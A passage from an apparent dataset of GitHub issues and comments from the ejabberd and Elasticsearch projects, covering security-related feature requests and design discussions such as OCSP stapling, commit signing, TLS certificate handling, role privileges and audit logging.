OCSP Stapling is very much recommend and is going to be the default in the web today.","We have this in ebe (commercial version of ejabberd), I'm not sure if the featrue is supposed to be ported to open source version.

BTW, in the meantime Google is getting rid of OCSP support in Chrome :)
> BTW, in the meantime Google is getting rid of OCSP support in Chrome :)

OCSP is different to [OCSP Stapling](https://en.wikipedia.org/wiki/OCSP_stapling). AFAIK ""OCSP Stapling"" is still used by Chrome if supplied.

In any way this is really a basic feature of TLS, so I'd highly suggest to make this available in the open source version. All web bigger web servers ([see here](https://en.wikipedia.org/wiki/OCSP_stapling#Deployment)) have it and for an XMPP server it would also be very useful.
OK, my bad, commercial version has pure ""OCSP"" support, i.e. it has PKIX client authentication support with OCSP/CRL validation.
OCSP Stapling looks like much better way to validate at least server certificates.
> OCSP Stapling looks like much better way to validate at least server certificates.

It is also a much better solution concerning privacy (as the CA does not have to be contacted) and it is faster too.
I'm interested in working on this. My guess is that the change to fix this should be introduced in fast_tls, right?I don't know. Maybe in `fast_tls`, maybe in [xmpp_stream_pkix](https://github.com/processone/ejabberd/blob/master/src/xmpp_stream_pkix.erl), depending on complexity.",no,"Kind:Feature,Component:Security,"
processone/ejabberd,187490366,"Sign git commits & releases (tags)","You should consider signing git commits & releases. (which verifies the source code instead/in addition of the binaries you publish)

* [onionshare#221 (comment)](https://is.gd/7vU4oK)
* It is also displayed on GitHub: https://github.com/blog/2144-gpg-signature-verification
* Here is GitHub's help for this: https://help.github.com/articles/generating-a-gpg-key/
* And here is how you can properly sign releases: https://wiki.debian.org/Creating%20signed%20GitHub%20releases","I have a question: what happens if I lose my GPG key? This is important, because I consider the probability of losing the key to be much higher than the probability of forging my commits.
The same as what happens in any other case with gpg keys. You have to create a new key and use a new key to sign your commits and stuff. You would have to upload [it to GitHub again](https://help.github.com/articles/associating-an-email-with-your-gpg-key/) and delete the old key and finally you will have to convince users of your software, who verify the git commits to import the new key.
Basically you can of course use the same key as the one you use for signing the release files on your website, if you're fine with that.
",no,"Component:Security,"
processone/ejabberd,487048466,"redis ssl/tls encriptions","I want use Redis for Session Management. But unfortunately jabber 19.08 couldn't connect to Redis that requires tls/ssl for connections.

It would appreciate it if you add support to ejabberd ssl/tls connection to Redis
",,no,"Component:Databases,Kind:Enhancement,Component:Security,"
processone/ejabberd,1243008248,"Support ECDSA+RSA dual stack certificates","Most other programs support to specify two certificates for the same hostname (one RSA certificate and one ECDSA certificate)
(nginx, exim, dovecot, prosody, ...)

Currently only a single certificate can be used for each host when using ejabberd.

This leads to having to decide between better performance (ECDSA cert) or better compatibility (RSA cert)

Please add an option to be able to specify multiple certificates/keys per hostname.

",,no,"Kind:Feature,Component:Security,"
elastic/elasticsearch,1162067678,"[DOCS] DLS/FLS no longer disable shard request cache.","### Description

The [DLS/FLS docs](https://www.elastic.co/guide/en/elasticsearch/reference/8.1/field-and-document-access-control.html) say:

> **NOTE**: Document- and field-level security disables the [shard request cache](https://www.elastic.co/guide/en/elasticsearch/reference/8.1/shard-request-cache.html).

This feature limitation was resolved in #70191 and the note should be removed from the docs.","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-docs (Team:Docs)",no,">docs,good first issue,:Security/Authorization,Team:Docs,Team:Security,"
elastic/elasticsearch,800196470,"CLI tool elasticsearch-setup-passwords does not work if TLS auth is enabled and certificates reference only domain names and not IPs","**Elasticsearch version** (`bin/elasticsearch --version`): `Version: 7.10.2, Build: default/rpm/747e1cc71def077253878a59143c1f785afa92b9/2021-01-13T00:42:12.435326Z, JVM: 15.0.`

**Plugins installed**: []

**JVM version** (`java -version`):
```
openjdk version ""15.0.1"" 2020-10-20
OpenJDK Runtime Environment AdoptOpenJDK (build 15.0.1+9)
OpenJDK 64-Bit Server VM AdoptOpenJDK (build 15.0.1+9, mixed mode, sharing)
```

**OS version** (`uname -a` if on a Unix-like system): `Linux hostname.example.com 4.18.0-240.10.1.el8_3.x86_64 #1 SMP Mon Jan 18 17:05:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`

**Description of the problem including expected versus actual behavior**: After successfully configuring Elasticsearch HTTPS support the server is reachable connecting with this curl CLI command  `curl -vvv --silent --user 'elastic:changeme' 'https://hostname.example.com:9200/'`

**Steps to reproduce**:

Just create certificates for Elasticsearch which don't include the IPs in the Subject Alt Names  but only the FQDN (in the example case is `hostname.example.com`). Install Elasticsearch from the repositories following the official guide and activate the HTTPS support with the options in the `elasticsearch.yml` file:
```
xpack.security.http.ssl.enabled: true
xpack.security.http.ssl.key: ""/etc/elasticsearch/certs/elasticsearch.key""
xpack.security.http.ssl.certificate: ""/etc/elasticsearch/certs/elasticsearch.crt""
xpack.security.http.ssl.certificate_authorities: [ ""/etc/elasticsearch/certs/ca.crt"" ]
```
Use the CLI command `elasticsearch-setup-passwords` to configure the passwords. It will try to connect to `https://IPofthefirstinterfaceofthemachine:9200/_security/_authenticate?pretty`. Obviously you get the error:
```
SSL connection to https://IPofthefirstinterfaceofthemachine:9200/_security/_authenticate?pretty failed: No subject alternative names matching IP address IPofthefirstinterfaceofthemachine found
```
The part of the code responsible for the generation of the URL is 
[this](https://github.com/elastic/elasticsearch/blob/f4d34534b79d5dc79ea5a3fb7ff2ee8eb31d1711/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/esnative/tool/CommandLineHttpClient.java#L134). What could make everything work automatically is the retrieval of the FQDN from the machine itself as it is shown by the `hostname` command.

**Confirmed workaround**: you must need to specify the url option when calling `elasticsearch-setup-passwords` as in the example:
`/usr/share/elasticsearch/bin/elasticsearch-setup-passwords interactive -u 'https://hostname.example.com:9200/'`.","Pinging @elastic/es-security (Team:Security)This behaviour is expected and [documented](https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-passwords.html) as
> If xpack.security.http.ssl.enabled is set to true, you must specify an HTTPS URL.
>
 
With above being said, I wonder whether we could simplify this by automatically enable certificate verification mode when an URL is not specified, e.g. something like: 
```
./bin/elasticsearch-setup-passwords interactive -E xpack.security.http.ssl.verification_mode=certificate
```

Since the command sources configuration from the local elasticsearch installation, it might be reasonable to assume that certs from the published IP address are applicable to the IP. I'll raise this to the team and report back.> This behaviour is expected and [documented](https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-passwords.html) as
> 
> > If xpack.security.http.ssl.enabled is set to true, you must specify an HTTPS URL.

I think that the error that the program prints is somehow cryptic. Why not making it print something like ""You must specify a URL since xpack.security.http.ssl.enabled is set to true"". It would help a lot troubleshooting people who are good sysadmins but not developers.



> With above being said, I wonder whether we could simplify this by automatically enable certificate verification mode when an URL is not specified, e.g. something like:
> 
> ```
> ./bin/elasticsearch-setup-passwords interactive -E xpack.security.http.ssl.verification_mode=certificate
> ```
> 
> Since the command sources configuration from the local elasticsearch installation, it might be reasonable to assume that certs from the published IP address are applicable to the IP. I'll raise this to the team and report back.

This is not a good idea since it assumes trust over something that clearly should not be trusted, even if it's just SAN configuration of the certificates. At this point just give the sysadmin a useful hint on what went wrong and let them figure out what to do (trivial since the error would point directly to the docs at that point).> Why not making it print something like ""You must specify a URL since xpack.security.http.ssl.enabled is set to true"". 

This is not strictly required. The tool has [smarts](https://github.com/elastic/elasticsearch/blob/e2ae0582f7c2c93d79f9b71f78259dbbdae2eb74/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authc/esnative/tool/CommandLineHttpClient.java#L135) to construct the URL for the _https_ scheme as well. But it relies on some ES yml settings to be specified.

I wonder whether we should disable TLS hostname verification (rely on certificate verification only) for URLs connecting to localhost? Can we assume that no one's MITM localhost connections? I think this is a reasonable assumption to make.This caused me no end of confusion because the `--url` is not in the help message.  If it were in the help message, or there was a man page, it would have saved me hours and hours.
```
[root@es-master-dev-003 ~]# /usr/share/elasticsearch/bin/elasticsearch-setup-passwords --help
Sets the passwords for reserved users

Commands
--------
auto - Uses randomly generated passwords
interactive - Uses passwords entered by a user

Non-option arguments:
command

Option             Description
------             -----------
-E <KeyValuePair>  Configure a setting
-h, --help         Show help
-s, --silent       Show minimal output
-v, --verbose      Show verbose output
[root@es-master-dev-003 ~]# /usr/share/elasticsearch/bin/elasticsearch-setup-passwords auto --url https://es-master-dev-003.dev.tgsre.net:9200
[root@es-master-dev-003 ~]# man elasticsearch-setup-passwords
No manual entry for elasticsearch-setup-passwords
[root@es-master-dev-003 ~]#
```",no,":Security/Security,team-discuss,Team:Security,"
elastic/elasticsearch,317454282,"Soft limits on number of roles assigned to a user","*Original comment by @jaymode:*

We've started introducing soft limits for things that are an anti-pattern such as too many shards. We've known for some time that too many roles assigned to a single user has issues with regards to performance. There are a few different ways that this can manifest:

If a user list a large number of roles, we have to find them and this can get expensive when things like unmapped_groups_as_roles is used since we try to look them up and just wind up wasting cycles.

The other ways that this manifests is the authorization becomes expensive and we authorize more than one time on many requests (LINK REDACTED). When we authorize, we are now merging automatons and this is expensive, which can lead to issues.

I think we should consider a limit to the number of roles that can be assigned to a user

",,no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,645669464,"Encrypt data at rest ","Consider adding support for encrypting Elasticsearch indices on disk. ","Pinging @elastic/es-distributed (:Distributed/Distributed)I'm sure we've talked about this in the past but not sure where we landed. I also don't know really which team it'd land on either, so I picked ""distributed"" because I expect they'll know better than I do what to do with this. Pinging @elastic/es-security (:Security/Security)For what it is worth, the support knowledge base article we share with customers talks about how Elastic decided encrypting data at rest is better handled by a tool like `dm-crypt` rather than baking those mechanisms into Elasticsearch. > I'm sure we've talked about this in the past but not sure where we landed

--> 

> how Elastic decided encrypting data at rest is better handled by a tool like dm-crypt rather than baking those mechanisms into Elasticsearch

Not necessarily saying that we shouldn't discuss this again, but we did discuss it fairly recently and the outcome was the above. I think the problem is that when most people think of encryption at rest they don't mean when the system is powered off, but just when it's stored on the disk, regardless of powered state.

Using dm-crypt only helps you when a system is powered off; it isn't going to help your data nodes that are usually (always) powered on and ready to be searched against. Like Bitlocker, it's an example of full disk encryption.

Really I think what most users are looking for is an application-level encryption solution that's also transparent to the end user while performing searches. There are some paid plugins that do this but it would be awesome if people didn't need those.

dm-crypt references, note the part that mentions data isn't protected while system is powered on:
https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/security_hardening/encrypting-block-devices-using-luks_security-hardening

Some (paid) plugins that do encryption at the application level:
https://ironcorelabs.com/docs/cloaked-search/overview/
https://titaniam.io/products/
",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,317447056,"document that run as supports wildcards and regex","*Original comment by @jaymode:*

Reported here: https://discuss.elastic.co/t/wildcards-in-run-as-role/46318

We can document the format of the run as field of a role better to indicate that run as supports wildcards and regular expressions in addition to specific vales.


","[docs issue triage]

Leaving open. This is still relevant.

As of writing, this documentation is now covered at https://www.elastic.co/guide/en/elasticsearch/reference/master/run-as-privilege.html",no,">docs,:Security/Authorization,Team:Docs,Team:Security,"
elastic/elasticsearch,317448060,"Add priority to .security/system indices created before 5.1.0","*Original comment by @n0othing:*

<!--
Please do not submit any issues related to security vulnerabilities that
could be exploited by an attacker. Instead, send an email to
EMAIL REDACTED If you have any doubts, send an email to
EMAIL REDACTED
-->

Index prioritization was added in 5.1 to certain system indices. However, indices created prior to 5.1 (e.g an upgrade from 2.4.x to 5.5+) wouldn't have it which could lead to gaps during recovery where users can't authenticate.

It'd be good if we could reapply the index priority setting on upgrades.",,no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,832365834,"Investigate performance improvements for has_privileges","The `_has_privileges` API is becoming a more significant building block of stack & solutions.  
I have noticed that it sometimes appears quite high in the list of requests. via the cloud proxies.

It would be helpful to look at whether it could be made more efficient, including the potential for caching.
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,503768424,"Allow Deprecation Info API to check for deprecated security configuration","We are in the process of deprecating few Index privilege names that are currently in use. These may or may not have an alternative that is an exact match and so it could be breaking change when few of the deprecated privilege names are removed in future versions.

The index privilege names are referred to when creating a role for the user. The roles are indexed in the `.security` index and sometimes defined in the file.

The [current deprecation info API](https://www.elastic.co/guide/en/elasticsearch/reference/master/migration-api-deprecation.html) captures information for `cluster_settings`, `node_settings`, `index_settings`, `ml_settings`. This seems to be more tied to `Settings` deprecation and maybe we could enhance this API to include additional deprecation information other than settings like the use of deprecated index privilege names in the roles from `.security` index or role file.

This issue exists to find if the current deprecation info API can be used for this purpose or if there are any other suggestions to handle this.

Relates: https://github.com/elastic/elasticsearch/issues/47333","Pinging @elastic/es-security (:Security/Authorization)Pinging @elastic/es-core-features (:Core/Features/Features)@bizybot I am making an assumption here that when these role names are used, we would emit a deprecation warning and log it. In which case, see #46106 and #46107. That’s going to be our general mechanism for exposing deprecated functionality without having to work too hard to acquire this information otherwise. Can you clarify if my assumption is correct and if what I propose in #46106 and #46107 would be acceptable as general infrastructure without having to build specific infrastructure for the situation here?Hi @jasontedor, Thank you for your comment. Indeed what you propose will help to showcase the deprecated usage of privilege names and that would be helpful for the user.
But the deprecation logging would happen only when the privilege names are referred mostly during authorization, so if the user does not log in and perform any action, the deprecation logs would be missing for this usage.

I assume that the Upgrade assistant acts on the info presented by deprecation info API (I might have the wrong assumption here), for example, if we scan `.security` index and find the roles that need to be migrated as they are using deprecated privilege names and then Upgrade assistant would look at that and invoke some migrate endpoints to perform migrations.
Would this be possible with the suggestions from #46106? I see that we will be collecting the deprecation logs, but unsure how it will be used by the upgrade assistant.
> But the deprecation logging would happen only when the privilege names are referred mostly during authorization, so if the user does not log in and perform any action, the deprecation logs would be missing for this usage.

It's not clear to me why we need to emit a deprecation warning for each user, but rather when we parse the role descriptors. Can you explain?

> I assume that the Upgrade assistant acts on the info presented by deprecation info API (I might have the wrong assumption here), for example, if we scan .security index and find the roles that need to be migrated as they are using deprecated privilege names and then Upgrade assistant would look at that and invoke some migrate endpoints to perform migrations.

The upgrade assistant offers suggestions that the user can employ to migrate from deprecated functionality. If it's possible to automatically upgrade instances in the .security index, we should do that internal to Elasticsearch automatically on behalf of the user, rather than expecting that they use the upgrade assistant to do so.To clarify the technical aspects of this a bit: Each type of deprecation check (Node, Cluster, Index, ML) has a framework that takes each check as a function object, and passes it the appropriate type of metadata (`IndexMetaData`, `ClusterState`, etc.). Because role information is not stored in the cluster state, but rather can be in a combination of the `.security` index and file-based roles, we would need a new piece of infrastructure to retrieve the appropriate information from Security to allow checks to be written against it.

If we can automatically upgrade roles, we should do that, and ignore the rest of this post.

If we can't handle the necessary changes automatically, I think putting these checks in the Deprecation Info API has a big advantage: it allows users to interactively query the API to make sure they've fixed everything that needs fixing, as opposed to having some uncertainty about that - I mean, I'm not sure what would trigger deprecation logs for deprecated role names, and I'm an ES developer.  Is it on node startup? Does it require a full cluster restart? If I was administrating a cluster I would feel very uncertain looking for a *lack* of deprecation logs to make sure I'd fixed the issue, which would be very frustrating given how much a broken security configuration can ruin your day.

To be clear: I'm absolutely for integrating the deprecation logs into the upgrade assistant. But I think for this case, if it's not too difficult, we should make this possible to check in the deprecation info API directly (assuming we can't just auto-fix it).@gwbrown I think that there is potential for the roles defined in .security to be automatically upgraded (we need someone from the security team to confirm), but not those that are on disk in the roles file (because we aren't going to mutate those).@jasontedor @gwbrown 

> It's not clear to me why we need to emit a deprecation warning for each user, but rather when we parse the role descriptors. Can you explain?

Sorry I did not elaborate on my comment. Yes, you are correct that the deprecation logging would happen when we parse the role descriptors. The role descriptors are loaded when the user authenticates and the authorization engine loads the role descriptors for the role name(s).
So there is a possibility that the deprecation warning might be missing for some role names if the user with the role never logs in.

> If we can automatically upgrade roles

I think we would not be able to automatically upgrade all the role descriptors, the reason being the source for the role descriptors can either be a file, `.security` index or custom roles provider.
Also, the deprecated role names might not have an exact replacement to take an automatic decision for migration and would need the user's inputs. +1 on the avoiding mutation of the file.

The integration of deprecation logs into the upgrade assistant will definitely help to showcase the warnings though there is an advantage in the deprecation info API as it can always parse the deprecations at one go from the `.security` and file roles store that allows users to see if there are any warnings related to it, instead of waiting for it be populated in the deprecation logs.

Note that both the ways are not going to emit all the deprecated usage there will be some misses for example if there is a custom roles provider deprecation info check function would not be able to parse the role descriptors generated by it or deprecation logging missing sometimes if the user does not log in.
> rather when we parse the role descriptors

I think the missing context is that we only load & parse index-based role descriptors when they are referenced in some way. That could be that a user with the role authenticates, or someone calls `GET /_security/roles`, but it is entirely normal for one or more roles to go for some period of time without being loaded/parsed.
We _could_ forcibly load all role descriptors on node startup (or master change, or ...) but we don't currently do that.

> I think that there is potential for the roles defined in .security to be automatically upgraded

I think we _can_, but I'm not sure we _should_, or at least I can't decide _when_ we should do that.
My reasoning is:
- I think we should deprecate the old names as soon as we define their replacements so that it's clear why there are two sets of names and which ones should be used. That is likely to be in a minor release.
- For completeness, I would expect us to expose that deprecation in a number of places including the Roles UI, the Roles API, and deprecation logs
- We _could_ automatically upgrade the security index in that release but it has some implications that are potentially confusing:
   1. It would mean that installing a minor upgrade would cause sudden, possibly unexpected, changes to their roles. This is likely to confuse users who are familiar with their existing privilege names and suddenly see that things are different.
   2. We would need to perform this same translation whenever the `PUT /_security/role/{name}` API was called so that the new/updated role didn't put the index back into a deprecated state. This would mean that `PUT` + `GET` would return a different JSON, which might cause problems for tooling.
- My gut feel is that users would prefer that we didn't apply automatic conversions of security data without them opting-in (especially in a minor).
- It would be reasonable to automatically upgrade the roles during a major upgrade when we remove the old names.
- However, giving users deprecation warnings in a minor, but not giving them the tools to fix them automatically until a major seem wrong. Some users will manually fix the roles when they see the warnings, only to find that there was a tool for that later in the release cycle.

Given the above, my thoughts were that the tool would be available, opt-in during the minor and then automatic at the major.
 
 > not those that are on disk in the roles file (because we aren't going to mutate those).

Correct.

> custom roles provider

I don't know how much we can do for custom role providers. The custom roles extension API doesn't provide a way to list role only to get them by name, so it's impossible to know if an extension defines a role that uses a deprecated privilege name unless that role is referenced somewhere. The Upgrade Assistant won't be much help here since it won't be able to _list custom roles that use deprecated privilege names_.
My hope is that anyone who has a custom roles provider will test it when the recompile it for a major release, but I'm probably optimistic there.

> deprecated role names might not have an exact replacement to take an automatic decision for migration

That's true in theory, but I don't think it is practically true in this case (per https://github.com/elastic/elasticsearch/issues/47333#issuecomment-540001635, I think every existing privilege can be replacted with one-or-more of the new privileges).

 

> We could forcibly load all role descriptors on node startup

> The Upgrade Assistant won't be much help here since it won't be able to list custom roles that use deprecated privilege names.

Given that we are considering #46106 which will integrate deprecation logging into upgrade assistant, this could be useful as we would be able to present all the deprecations usage most of the time (except for the custom roles).

We do not then need to modify the deprecation info API to collect the information from file & `.security` index if we forcibly load all the role descriptors at startup and do the deprecation logging.> We do not then need to modify the deprecation info API to collect the information from file & .security index if we forcibly load all the role descriptors at startup and do the deprecation logging.

If we take that approach then it is hard for the user to know whether they have fixed everything (per @gwbrown's [earlier comment](https://github.com/elastic/elasticsearch/issues/47714#issuecomment-539571867)). They probably won't know what triggers the deprecation log, so won't know whether the lack of logging is definitive evidence that the problem is fixed or simply means that the logs haven't run.

I think we need a way for users to explicitly check that the problem is fixed and get an unambiguous 💚 or 🔴 I think from the discussions so far it is desirable to get point in time deprecation info for the usage of deprecated index privileges by scanning the file roles store and `.security` index.
This allows users/upgrade assistant to check whether the deprecation warnings have been addressed before proceeding with the upgrade.

We can provide migration API (this might require another discussion on how to achieve this as the upgrade API is removed) for `.security` index roles and for file-based roles, the users could go and correct the usage in the file. The deprecation info API invocation allows the user to verify whether the roles have been migrated or not after running the migration step.

It seems like in this case it would be good to add the infrastructure in the deprecation info API to collect this information and report it.

@gwbrown @jasontedor thoughts? Thank you.I'll do an in-depth look at what will be required to support this in the Deprecation Info API shortly, and report my findings back here. With luck, it will be relatively straightforward. I may come back with questions about Security infrastructure/classes/etc. as part of that process.I've done some initial investigation into this and it doesn't look like it'll be too difficult. There's a bit of a wrinkle in that the file-based roles aren't retrievable via the role management APIs, but that shouldn't be too difficult to handle.  It looks straightforward to add an internal transport action that can retrieve the file-based roles from each node, somewhat similar to how the node-specific deprecation checks are executed (although in this case it will ship the role definitions to the coordinating node).  Does that sound reasonable to the Security folks on this thread?

I would have preferred having each node do the evaluation itself so that we could leverage the existing node-specific deprecation check infrastructure, but that isn't straightforward due to deprecation checks and the necessary Security classes living in different plugins.

I'll have a POC PR up soon, although at this point it may be after EAH.",no,">enhancement,>upgrade,:Security/Authorization,team-discuss,:Data Management/Other,Team:Data Management,Team:Security,"
elastic/elasticsearch,317448624,"Authentication stream version check exists in 5.x only  ","*Original comment by @tvernum:*

In LINK REDACTED a LINK REDACTED was added to `Authentication` to ensure that the version of the serialized authentication matches the version of the connection it's being read from.

This check is in 5.x but is not in 6.x or master.

It's being triggered in LINK REDACTED due to what seems to be a real versioning issue in CCS, but the problem the customer is seeing doesn't occur in 6.x because the check isn't there (the version mismatch exists, it just doesn't throw any exceptions)

Do we want to add that check in to 6.x and 7.x ?","*Original comment by @tvernum:*

CC: @jaymode (with proper tagging this time)
  *Original comment by @jaymode:*

I think that we should add this check to master and 6.x",no,">enhancement,help wanted,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317449407,"API option to list users by role","*Original comment by @jaymode:*

https://discuss.elastic.co/t/how-i-get-list-of-users-in-specific-role/67481

The user requested the ability to list users that are assigned to a specific role. We could add a request parameter to the get users API that would allow this. It is pretty common to want this so you can see what users have the admin role or something else.

",,no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1125356721,"YAML test ""Test get service accounts"" does not work well with REST compat","This YAML test asserts number of service accounts returned from the API. With new service accounts added to the system, this number changes and breaks V7 REST compat. REST compat framework does provie the `replaceValueInLength` transform for modifying the value to be asserted. However, there are a few things going on in the test and it is not possible to replace with a single number. 

The proposed solution is to:
1. Split the test into 3 smaller ones so each of them only assert a single length value
2. Update the build file to apply proper transforms for each of the new smaller tests.
3. Item 1 needs to be backported to 7.17 branch for it to really work.
","Pinging @elastic/es-security (Team:Security)",no,">test,:Security/Security,Team:Security,"
elastic/elasticsearch,815760289,"Support authorization delegation for the native realm","It can be useful to pull user metadata from a directory service, but still rely on the credential validation performed by ES in the native realm, for example because this is where the other realms/clusters store all user metadata.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authorization,team-discuss,Team:Security,"
elastic/elasticsearch,317449263,"Add option to go to a known failure state when auditing fails","*Original comment by @jaymode:*

Some users have the requirement that if auditing fails, the application must go to a known failure state such that it can no longer be interacted with until the issue has been corrected. In terms of elasticsearch, the easiest failure state to go to would be to shut down the node. This must be an opt-in feature with the implications well documented.",,no,">feature,:Security/Audit,Team:Security,"
elastic/elasticsearch,368745050,"Allow defining privileges limited to a subset of a resource","When considering cluster actions, Security uses a binary decision based on the action name and the user's privileges. In order to meet the needs of our users, security should also take the actual resource into account like we do in the case of index level actions.

The team recently discussed this and we feel that it is possible to accomplish this using the existing infrastructure for security by inspecting requests and what they will be affecting. In terms of defining these privileges, the format developed as part of https://github.com/elastic/elasticsearch/pull/32116; that is they would be defined under the `policy` field of a role.

This issue will be used to track the overall progress of adding these new privilege restrictions.

- [ ] Ingest Pipeline Access Controls
- [ ] Index template access controls
- [ ] Search template access controls
- [ ] Snapshot/Restore access controls
- [ ] Cluster settings access controls
- [ ] Index settings
- [ ] Stored scripts
- [ ] Persistent tasks
- [ ] ML Jobs
- [ ] Watches
","Pinging @elastic/es-security",no,"Meta,:Security/Security,Team:Security,"
elastic/elasticsearch,317449830,"[Security] Consider using max_int for index.priority","*Original comment by @pickypg:*

During a recovery, we use `index.priority` to determine the order that shards should be reallocated. I noticed that the current `index.priority` for the security index is `1000`, which is _probably_ higher than any other index in the cluster (since by default it's 1 and most people don't set it).

However, I feel like we should _guarantee_ it's the highest value by just setting it to the highest possible value? I cannot think of a more important index than the `.security` index _when_ it's in use.","*Original comment by @albertzaharovits:*

Hmm, I wonder why this has not caught attention. I am guessing ""probably higher than any other index in the cluster"" is good enough for folks.
@alexbrasetvik I know cloud is fighting with these kind of troubles, do you have any stance on this?
CC @jaymode I saw the setting **""index.priority"": 1000** in the file _x-pack/plugin/core/src/main/resources/security-index-template.json_.

While it is ideal to guarantee the highest value rather than just setting a arbitrarily high number, I am still curious about the following:

1. Under what circumstances will this be an issue? My assumption is I would need to have more than 1000 indexes in the cluster to have **.security** index de-prioritized
2. Even with the highest value (MAX_INT in this case), an index created more recently with the same value will get more priority. So theoretically, the guarantee cannot exist.
3. Is **.security** always guaranteed to be the most important? Or is it enough for the value to be large so that the recovery process gets to that index early rather than have an enforcement of always being the first?",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,317449008,"Enhance audit entries with the 'cluster_name' field","*Original comment by @albertzaharovits:*

Following on LINK REDACTED
Audit logs from several clusters might be gathered on a single cluster and possibly the same index. There is an option, for all the events to include the host name and address.
There should be an optional setting to include the cluster name in all audit events. The audit log trail is already sizeable so the cluster name should not be printed by default.","*Original comment by @jaymode:*

> The audit log trail is already sizeable so the cluster name should not be printed by default.

I wonder if this is something that can be added on the filebeat side of things when we index the data?*Original comment by @albertzaharovits:*

I think so, that's why I rushed to close LINK REDACTED . This would definitely be a convenience feature. @loekvangool WDYT ?*Original comment by @loekvangool:*

I think we should prefer auto-detection of the cluster UUID or name above adding the field manually, because Monitoring does that out of the box as well and users likely expect a similar experience for Audit.

That said, it could be done manually in Filebeat and it would be functional.It would be possible to manually configure Filebeat to add the field but I would prefer a fully automated solution that also works in dynamic environments like docker or kubernetes. I think the problem is more generic and applies to cases where there is also only 1 cluster on a machine and applies to all log files from Elasticsearch. 

Assuming multiple nodes (from same or different clusters) run one a pod in Kubernetes. Filebeat will see all the log files but how will it know to which cluster each log file belongs? A few ideas:

* Log file name contains cluster id so filebeat can extract it
* There is an additional file from which filebeat could look up the cluster id
* Each log line contains cluster id
* Filebeat makes a http request to the cluster to fetch and cache the cluster id

In the above I always mentioned the cluster id because the cluster name could change over time as far as I know but the cluster id can't. It would be nice to have both but if we can only have one I would opt for the cluster id. We can still figure out ways how to enrich events based on the cluster id with the cluster name.Hi @ruflin,
Do you still think `cluster_name` in each log entry is useful? Have there been any new developments that allow filebeat to deal easier without a `cluster_name` on every log entry?
I think the `node_id` from each event, coupled with the `cluster.name` from the log file name are as an unique identifier as possible.

I am asking this is connection to https://github.com/elastic/beats/issues/8831 do you think this is impacting the work on that.

cc @ycombinator I'm not aware of any development on the Beats side that would make this requirement obsolete. I still think we need it but leave it to @ycombinator to comment as he took over this work.Hey @albertzaharovits, there are no developments AFAIK either in Filebeat to get information from anywhere other than the files it is ""tailing"" for Elasticsearch logs. So I would still prefer it if the structured audit log contained the `cluster_uuid` field in it. We have plans to build logging UIs in Monitoring and since Monitoring data already contains `cluster_uuid`, it would be easy to correlate logs to clusters in the UI. If this is not possible, then `cluster_name` is fine but it's not a perfect key as it could change over time for the same cluster. 
Hi @ycombinator 

I want to mention that `cluster_uuid` will change if you add nodes to the cluster, but to form the cluster the `cluster_name` has to be the same over all the cluster nodes. Therefore, in some circumstances, `cluster_name` might be more ""established"", even though `cluster_name` is a setting the admin can change.

I am asking because we really hope not to add ""static"" fields to the audit log especially if they are enabled by default. This is because it is already terribly verbose. Moreover we want to keep the file user readable and adding constant fields decreases this user friendliness.

If you have any ideas of how we can solve this, I'm all ears!",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,1258273305,"[Discuss] Creating new app privileges for package install","This discussion started on the Fleet RBAC work.

@dakrone @tvernum Could provide some input here? 
To summarize the situation:
- We're currently designing the next phases of Fleet and Integration's RBAC model and we want to plan ahead enough to ensure we don't need any breaking changes to our model which would require role migrations (which don't exist).
- We suspect that at some point, Elasticsearch will be responsible for installing packages directly (see [this doc](https://docs.google.com/document/d/1TmISUtP_xQ_bvUSeftLiuYefu2sc1GG-g75mBbzbG1w/edit#)) and want to be sure that any package install privileges we introduce now could easily be adopted by Elasticsearch in the future without requiring a breaking change or role migrations.
- In order to facilitate this, we're considering breaking out the package install privileges into a separate set of application privileges from Kibana's application privileges. See https://github.com/elastic/obs-dc-team/issues/731#issuecomment-1094658965 for details.

Questions for you all:
- When package installation is changed to be done by Elasticsearch, would ES be able to read application privileges for a theoretical ""integrations"" application?
- Aside from ""is it possible"", is this even a good idea from an API / design perspective?
- Should we just assume that once package install is in Elasticsearch, that role migrations would be available as well to solve this problem? (this would create a hard dependency between these separate projects)
- Do you have any better ideas?

_Originally posted by @joshdover in https://github.com/elastic/obs-dc-team/issues/731#issuecomment-1095039629_","Pinging @elastic/es-security (Team:Security)",no,":Security/Authorization,Team:Security,"
elastic/elasticsearch,1273304369,"Support ActivateUserProfile for a user with run_as","Currently the [ActivateUserProfile API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-activate-user-profile.html) takes a user credential and creates/updates the profile document for the user. When Kibana is used in a proxy setup, where the true end-user is provided as the run-as header, it is not possible to call ActivateUserProfile for the true end-user (since Kibana does not have its credential). We discussed previously that this could be supported by having a `run_as` field in the request body, i.e. a combination of proxy user credential and `run_as` username.

This is not an immediate requirement and definitely out of scope of the user profile mvp. The issue is created mainly to track the discussion so it is not lost.","Pinging @elastic/es-security (Team:Security)",no,":Security/Security,Team:Security,"
elastic/elasticsearch,1011819872,"Spectacularly Annoying: Warning: 299 Elasticsearch-7.15.0-79d65f6e357953a5b3cbcc5e2c7c21073d89aa29","Having recently run apt upgrade on an Ubuntu 20.04 box I see that I've now got Elasticsearch 7.15.0 and it comes with a spectacular misfeature - an endless cascade of Warning: 299 regarding network security settings when accessing Kibana.

""Warning: 299 Elasticsearch-7.15.0-79d65f6e357953a5b3cbcc5e2c7c21073d89aa29""

The URL, which can not simply be selected and accessed from the warning, is this:

https://www.elastic.co/guide/en/elasticsearch/reference/7.15/security-minimal-setup.html

